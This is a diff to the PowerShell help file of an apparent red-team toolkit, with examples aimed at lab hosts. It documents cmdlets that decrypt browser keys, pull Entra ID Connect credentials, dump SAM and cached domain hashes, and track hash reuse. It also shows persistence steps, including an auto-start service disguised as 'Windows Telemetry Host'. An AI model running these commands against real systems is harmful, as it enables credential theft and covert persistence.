+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Browser</maml:name>
           <command:parameterValue>String</command:parameterValue>
         </command:parameter>
         <command:parameter required="false">
@@ -880,9 +1555,9 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
         <command:parameterValue>String</command:parameterValue>
       </command:parameter>
       <command:parameter>
-        <maml:name>ProfileName</maml:name>
+        <maml:name>Browser</maml:name>
         <maml:description>
-          <maml:para>Chrome profile folder name under User Data (default: Default).</maml:para>
+          <maml:para>Which Chromium browser to target (default: Chrome). Valid values: Chrome, Edge, Brave, Chromium.</maml:para>
         </maml:description>
         <command:parameterValue>String</command:parameterValue>
       </command:parameter>
@@ -905,17 +1580,24 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
       <command:example>
         <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
         <maml:code>$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
-Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
+Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
         <maml:remarks>
-          <maml:para>Decrypts saved Chrome cookies for accessible user profiles.</maml:para>
+          <maml:para>Decrypts Chromium state keys for accessible user profiles (default browser: Chrome).</maml:para>
         </maml:remarks>
       </command:example>
       <command:example>
         <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
-        <maml:code>Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
-  Select-Object HostKey, Name, Value, ExpiresUtc</maml:code>
+        <maml:code>Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -Browser Edge -MasterKeys $userKeys</maml:code>
         <maml:remarks>
-          <maml:para>Filters to a specific user and selects common fields.</maml:para>
+          <maml:para>Filters to a specific user and targets Microsoft Edge instead of Google Chrome.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Brave -MasterKeys $userKeys |
+  Select-Object UserName, Browser, StateKeyHex, MasterKeyGuid, HmacValidated, FailureReason</maml:code>
+        <maml:remarks>
+          <maml:para>Targets Brave and selects common fields.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -1313,6 +1995,154 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
 
   <command:command>
     <command:details>
+      <command:name>Get-TBOAdConnectCredentials</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOAdConnectCredentials</command:noun>
+      <maml:description>
+        <maml:para>Extracts and decrypts Entra ID (Azure AD) Connect Sync (ADSync) connector credentials.</maml:para>
+        <maml:para>Downloads the ADSync database (ADSync.mdf/ADSync_log.ldf) over SMB and queries it locally via SQL LocalDB, then decrypts the ADSync KeySet credential from the ADSync service profile using DPAPI_SYSTEM.</maml:para>
+        <maml:para>If the ADSync database files are locked on the target, use -Snapshot with an @GMT-... token.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOAdConnectCredentials</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>LocalDbInstance</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Snapshot</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>DpapiMachineKey</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>DpapiUserKey</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>DpapiMachineKeyBytes</maml:name>
+          <command:parameterValue>Byte[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>DpapiUserKeyBytes</maml:name>
+          <command:parameterValue>Byte[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>KeepDownloadedDb</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeXml</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>LocalDbInstance</maml:name>
+        <maml:description>
+          <maml:para>SQL LocalDB instance name used to attach and query the downloaded ADSync database files (default: MSSQLLocalDB).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Snapshot</maml:name>
+        <maml:description>
+          <maml:para>@GMT- snapshot token used to read files from a VSS shadow copy.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>DpapiMachineKey</maml:name>
+        <maml:description>
+          <maml:para>Hex-encoded DPAPI_SYSTEM machine key (from Get-TBORegLsaSecrets -Name DPAPI_SYSTEM).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>DpapiUserKey</maml:name>
+        <maml:description>
+          <maml:para>Hex-encoded DPAPI_SYSTEM user key (from Get-TBORegLsaSecrets -Name DPAPI_SYSTEM).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>DpapiMachineKeyBytes</maml:name>
+        <maml:description>
+          <maml:para>Raw DPAPI_SYSTEM machine key bytes.</maml:para>
+        </maml:description>
+        <command:parameterValue>Byte[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>DpapiUserKeyBytes</maml:name>
+        <maml:description>
+          <maml:para>Raw DPAPI_SYSTEM user key bytes.</maml:para>
+        </maml:description>
+        <command:parameterValue>Byte[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>KeepDownloadedDb</maml:name>
+        <maml:description>
+          <maml:para>Keep the downloaded ADSync database files on disk for debugging (stored under %TEMP%).</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeXml</maml:name>
+        <maml:description>
+          <maml:para>Include raw XML fields from the ADSync database in the output.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM | Get-TBOAdConnectCredentials</maml:code>
+        <maml:remarks>
+          <maml:para>Recovers DPAPI_SYSTEM from LSA secrets, then extracts AAD Connect credentials.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>$token = (Get-TBOSmbSnapshots -Path '\\corp1-adconnect01.corp1.lab.home-labs.lol\C$\Program Files\Microsoft Azure AD Sync\Data' | Select-Object -First 1).Token
+Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBOAdConnectCredentials -Snapshot $token</maml:code>
+        <maml:remarks>
+          <maml:para>Uses a VSS shadow copy when the ADSync database files are locked.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
       <command:name>Out-TBOSmbFile</command:name>
       <command:verb>Out</command:verb>
       <command:noun>TBOSmbFile</command:noun>
@@ -1546,6 +2376,13 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
         <command:parameterValue>Int32</command:parameterValue>
       </command:parameter>
       <command:parameter>
+        <maml:name>Socks5Proxy</maml:name>
+        <maml:description>
+          <maml:para>Optional SOCKS5 proxy for SMB connections. Use host:port (ex: 127.0.0.1:1080) or socks5://host:port. SOCKS5 authentication is not currently supported.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
         <maml:name>NameResolveOptions</maml:name>
         <maml:description>
           <maml:para>Name resolution options for the SMB target.</maml:para>
@@ -1772,6 +2609,13 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
           <maml:para>Override the SMB port.</maml:para>
         </maml:description>
         <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Socks5Proxy</maml:name>
+        <maml:description>
+          <maml:para>Optional SOCKS5 proxy for SMB connections. Use host:port (ex: 127.0.0.1:1080) or socks5://host:port. SOCKS5 authentication is not currently supported.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
       </command:parameter>
       <command:parameter>
         <maml:name>NameResolveOptions</maml:name>
@@ -2188,6 +3032,8 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
       <command:noun>TBOSmbItem</command:noun>
       <maml:description>
         <maml:para>Copies files or directories between local paths and SMB paths using backup intent.</maml:para>
+        <maml:para>Recursive directory copies skip reparse-point directories by default, including projected filesystem tags.</maml:para>
+        <maml:para>Use -FollowReparse to traverse reparse directories. Following links can expand scope and revisit paths through junctions/symlinks.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -2247,6 +3093,13 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
         <command:parameterValue>Switch</command:parameterValue>
       </command:parameter>
       <command:parameter>
+        <maml:name>FollowReparse</maml:name>
+        <maml:description>
+          <maml:para>Traverse reparse-point directories during recursive directory copies. By default reparse directories are skipped.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
         <maml:name>ChunkSize</maml:name>
         <maml:description>
           <maml:para>Copy chunk size in bytes.</maml:para>
@@ -2267,6 +3120,13 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machi
         <maml:code>Copy-TBOSmbItem -Source tbo:\Windows\System32\Microsoft\Protect\S-1-5-18 -Destination C:\Temp\MasterKeys -CreateDirectories</maml:code>
         <maml:remarks>
           <maml:para>Recursively copies a remote directory to the local machine.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Copy-TBOSmbItem -Source tbo:\Repo -Destination C:\Temp\Repo -CreateDirectories -FollowReparse -Verbose</maml:code>
+        <maml:remarks>
+          <maml:para>Recursively copies a directory while traversing reparse-point directories. Verbose output reports projected/reparse traversal and cycle skips.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -3081,6 +3941,7 @@ Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Secti
       <maml:description>
         <maml:para>Reads a security descriptor for a remote registry key.</maml:para>
         <maml:para>Returns a portable SecurityDescriptor by default. Use -AsSddl, -AsBytes, or -AsWindows (Windows only) to change output format.</maml:para>
+        <maml:para>For local-mode registry access (-ServerName localhost/loopback), SACL sections require SeSecurityPrivilege to be present and enabled.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -3130,7 +3991,7 @@ Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Secti
       <command:parameter>
         <maml:name>Sections</maml:name>
         <maml:description>
-          <maml:para>Security descriptor sections to retrieve (default: Owner, Group, DACL).</maml:para>
+          <maml:para>Security descriptor sections to retrieve (default: Owner, Group, DACL). SACL requests in local mode require SeSecurityPrivilege.</maml:para>
         </maml:description>
         <command:parameterValue>SecurityInfo</command:parameterValue>
       </command:parameter>
@@ -3182,6 +4043,7 @@ Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Secti
       <maml:description>
         <maml:para>Writes a security descriptor to a remote registry key.</maml:para>
         <maml:para>Accepts portable SecurityDescriptor instances, SDDL strings, raw byte arrays, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only.</maml:para>
+        <maml:para>For local-mode registry access (-ServerName localhost/loopback), applying SACL sections requires SeSecurityPrivilege to be present and enabled.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -3230,7 +4092,7 @@ Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Secti
       <command:parameter>
         <maml:name>Sections</maml:name>
         <maml:description>
-          <maml:para>Security descriptor sections to apply (default: DACL).</maml:para>
+          <maml:para>Security descriptor sections to apply (default: DACL). SACL requests in local mode require SeSecurityPrivilege.</maml:para>
         </maml:description>
         <command:parameterValue>SecurityInfo</command:parameterValue>
       </command:parameter>
@@ -3288,7 +4150,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <command:parameter>
         <maml:name>ResolveSid</maml:name>
         <maml:description>
-          <maml:para>Resolve SIDs to names (not implemented yet).</maml:para>
+          <maml:para>Resolve SIDs to account names from remote registry data (Volatile Environment/ProfileList) without LSA calls.</maml:para>
         </maml:description>
         <command:parameterValue>Switch</command:parameterValue>
       </command:parameter>
@@ -3299,6 +4161,13 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <maml:code>Get-TBORegSessions -ServerName corp1-web01.corp1.lab.home-labs.lol</maml:code>
         <maml:remarks>
           <maml:para>Lists user SIDs from HKEY_USERS.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBORegSessions -ServerName corp1-web01.corp1.lab.home-labs.lol -ResolveSid</maml:code>
+        <maml:remarks>
+          <maml:para>Resolves each session SID to DOMAIN\user or a profile name when available.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -3420,7 +4289,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <command:verb>Get</command:verb>
       <command:noun>TBORegServiceDetails</command:noun>
       <maml:description>
-        <maml:para>Reads extended registry-backed service details including core configuration, dependencies, security descriptor, Parameters subkey values, and whether an _SC_ service credential exists.</maml:para>
+        <maml:para>Reads extended registry-backed service details including core configuration, dependencies, security descriptor, Parameters/Performance subkey values, and whether an _SC_ service credential exists.</maml:para>
         <maml:para>TriggerInfo entries include the TriggerInfo subkey path plus raw registry values for round-trip edits.</maml:para>
         <maml:para>FailureActions registry values can be modified, but malformed data can break service startup.</maml:para>
       </maml:description>
@@ -3482,6 +4351,13 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       </command:example>
       <command:example>
         <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'WmiApSrv' | Select-Object KeyName, ServiceDll, ServiceMain, PerformanceLibrary, PerformanceOpen, PerformanceCollect, PerformanceClose</maml:code>
+        <maml:remarks>
+          <maml:para>Surfaces technique-relevant Parameters and Performance subkey values.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
         <maml:code>$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'</maml:code>
         <maml:code>$trigger = $svc.TriggerInfo | Select-Object -First 1</maml:code>
         <maml:code>$trigger.Values | Format-Table Name, ValueType, Value</maml:code>
@@ -3491,7 +4367,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         </maml:remarks>
       </command:example>
       <command:example>
-        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
+        <command:title>-------------------------- EXAMPLE 5 --------------------------</command:title>
         <maml:code>$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'</maml:code>
         <maml:code>$triggerPath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)\TriggerInfo\1"</maml:code>
         <maml:code>New-TBORegKey -ServerName $svc.ServerName -Path $triggerPath</maml:code>
@@ -3502,13 +4378,24 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         </maml:remarks>
       </command:example>
       <command:example>
-        <command:title>-------------------------- EXAMPLE 5 --------------------------</command:title>
+        <command:title>-------------------------- EXAMPLE 6 --------------------------</command:title>
         <maml:code>$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService2'</maml:code>
         <maml:code>$servicePath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)"</maml:code>
         <maml:code>$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceFailureActionScenarios]::RunCommandFirst("C:\Windows\System32\notepad.exe")</maml:code>
         <maml:code>$values | ForEach-Object { Set-TBORegValue -ServerName $svc.ServerName -Path $servicePath -Name $_.Name -Type $_.ValueType -Value $_.Value }</maml:code>
         <maml:remarks>
           <maml:para>Sets FailureActions to run a command on first failure. Use for research only.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 7 --------------------------</command:title>
+        <maml:code>$serviceName = 'TBORegSvc'</maml:code>
+        <maml:code>$servicePath = "HKLM\SYSTEM\CurrentControlSet\Services\$serviceName"</maml:code>
+        <maml:code>New-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $servicePath</maml:code>
+        <maml:code>$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceCreateScenarios]::AutoStartOwnProcess('%SystemRoot%\Temp\tbo-agent.exe', 'Windows Telemetry Host', 'Telemetry host service.')</maml:code>
+        <maml:code>$values | ForEach-Object { Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $servicePath -Name $_.Name -Type $_.ValueType -Value $_.Value }</maml:code>
+        <maml:remarks>
+          <maml:para>Stages a service key for reboot execution by writing service values directly to the Services registry path.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -3594,7 +4481,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <command:verb>Get</command:verb>
       <command:noun>TBOScheduledTaskDetails</command:noun>
       <maml:description>
-        <maml:para>Reads scheduled task XML definitions, parses triggers/actions/principal/settings, and returns the task file security descriptor.</maml:para>
+        <maml:para>Reads scheduled task XML definitions, parses triggers/actions/principal/settings, and returns both the task file security descriptor and the TaskCache registry security descriptor.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -3673,14 +4560,14 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <command:parameter>
         <maml:name>AsSddl</maml:name>
         <maml:description>
-          <maml:para>Return the security descriptor as an SDDL string.</maml:para>
+          <maml:para>Return security descriptors as SDDL strings.</maml:para>
         </maml:description>
         <command:parameterValue>Switch</command:parameterValue>
       </command:parameter>
       <command:parameter>
         <maml:name>AsWindows</maml:name>
         <maml:description>
-          <maml:para>Return the security descriptor as a Windows RawSecurityDescriptor.</maml:para>
+          <maml:para>Return security descriptors as Windows RawSecurityDescriptor objects.</maml:para>
         </maml:description>
         <command:parameterValue>Switch</command:parameterValue>
       </command:parameter>
@@ -3705,6 +4592,90 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <maml:code>Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\Microsoft\\Windows\\Defrag\\*' -AsSddl</maml:code>
         <maml:remarks>
           <maml:para>Returns task details and security descriptors as SDDL strings.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Set-TBOScheduledTaskSecurityDescriptor</command:name>
+      <command:verb>Set</command:verb>
+      <command:noun>TBOScheduledTaskSecurityDescriptor</command:noun>
+      <maml:description>
+        <maml:para>Writes the TaskCache registry security descriptor (SD value) for a scheduled task.</maml:para>
+        <maml:para>Accepts portable SecurityDescriptor instances, SDDL strings, raw byte arrays, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Set-TBOScheduledTaskSecurityDescriptor</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="2">
+          <maml:name>SecurityDescriptor</maml:name>
+          <command:parameterValue>Object</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+      <command:syntaxItem>
+        <command:name>Set-TBOScheduledTaskSecurityDescriptor</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>InputObject</maml:name>
+          <command:parameterValue>TboScheduledTaskDetailsInfo</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="2">
+          <maml:name>SecurityDescriptor</maml:name>
+          <command:parameterValue>Object</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="1">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Task path (for example, \Microsoft\Windows\Defrag\ScheduledDefrag).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="1">
+        <maml:name>InputObject</maml:name>
+        <maml:description>
+          <maml:para>Input task details from Get-TBOScheduledTaskDetails.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboScheduledTaskDetailsInfo</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="2">
+        <maml:name>SecurityDescriptor</maml:name>
+        <maml:description>
+          <maml:para>Security descriptor to write. Accepts portable SecurityDescriptor instances, SDDL strings, raw byte arrays, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only.</maml:para>
+        </maml:description>
+        <command:parameterValue>Object</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$task = Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask' -AsSddl
+Set-TBOScheduledTaskSecurityDescriptor -ServerName $task.ServerName -Path $task.TaskPath -SecurityDescriptor $task.TaskSecurityDescriptor</maml:code>
+        <maml:remarks>
+          <maml:para>Reads the TaskCache security descriptor as SDDL and writes it back (edit the SDDL string to modify permissions).</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -3835,6 +4806,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <command:noun>TBORegCachedCredentials</command:noun>
       <maml:description>
         <maml:para>Decrypts cached domain credentials from HKLM\SECURITY\Cache and returns DCC1/DCC2 hashes with usernames.</maml:para>
+        <maml:para>If cache ingestion is enabled (via -Cache or TITANIS_TBO_CACHE_INGEST), writes DCC1/DCC2 observations into the persistent cache for later reuse queries.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -3855,6 +4827,14 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <command:parameter required="false">
           <maml:name>LsaKeyBytes</maml:name>
           <command:parameterValue>Byte[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Cache</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CachePath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
         </command:parameter>
       </command:syntaxItem>
     </command:syntax>
@@ -3887,6 +4867,20 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         </maml:description>
         <command:parameterValue>Byte[]</command:parameterValue>
       </command:parameter>
+      <command:parameter>
+        <maml:name>Cache</maml:name>
+        <maml:description>
+          <maml:para>Overrides the cache ingestion default. Use -Cache to force cache writes or -Cache:$false to suppress writes when TITANIS_TBO_CACHE_INGEST is enabled.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CachePath</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override used when writing cache observations. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
     </command:parameters>
     <command:examples>
       <command:example>
@@ -3901,6 +4895,15 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <maml:code>Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$1'</maml:code>
         <maml:remarks>
           <maml:para>Reads a specific cache value.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
+Get-TBORegCachedCredentials -ServerName corp1-web02.corp1.lab.home-labs.lol -Cache
+Get-TBOCacheCredentialReuse -Kind DCC2 -MinimumMachineCount 2</maml:code>
+        <maml:remarks>
+          <maml:para>Writes DCC observations to the cache and shows DCC2 hashes observed on multiple machines.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -4149,6 +5152,7 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
       <maml:description>
         <maml:para>Retrieves local SAM account hashes from the remote registry.</maml:para>
         <maml:para>Returns the account name, full name, and RID alongside the hash data.</maml:para>
+        <maml:para>If cache ingestion is enabled (via -Cache or TITANIS_TBO_CACHE_INGEST), writes NTHash observations into the persistent cache for later reuse queries.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -4158,6 +5162,14 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
           <maml:name>ServerName</maml:name>
           <command:parameterValue>String</command:parameterValue>
         </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Cache</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CachePath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
       </command:syntaxItem>
     </command:syntax>
     <command:parameters>
@@ -4165,6 +5177,20 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <maml:name>ServerName</maml:name>
         <maml:description>
           <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Cache</maml:name>
+        <maml:description>
+          <maml:para>Overrides the cache ingestion default. Use -Cache to force cache writes or -Cache:$false to suppress writes when TITANIS_TBO_CACHE_INGEST is enabled.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CachePath</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override used when writing cache observations. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
         </maml:description>
         <command:parameterValue>String</command:parameterValue>
       </command:parameter>
@@ -4182,6 +5208,15 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
